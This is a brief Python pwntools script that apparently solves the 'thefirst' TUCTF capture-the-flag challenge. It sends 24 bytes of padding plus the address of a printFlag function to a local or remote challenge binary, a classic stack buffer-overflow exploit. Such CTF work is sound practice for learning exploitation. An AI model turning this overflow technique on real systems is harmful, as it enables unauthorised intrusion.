#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
# context(log_level="debug", arch="i386", os="linux")
if debug == 1:
    p = process('./thefirst')
else:
    p = remote('chal.tuctf.com', 30508)

pd = 'a' * 24
pd += p32(0x080491F6)  # printFlag
p.sendlineafter("Let's see what you can do\n> ", pd)
p.interactive()
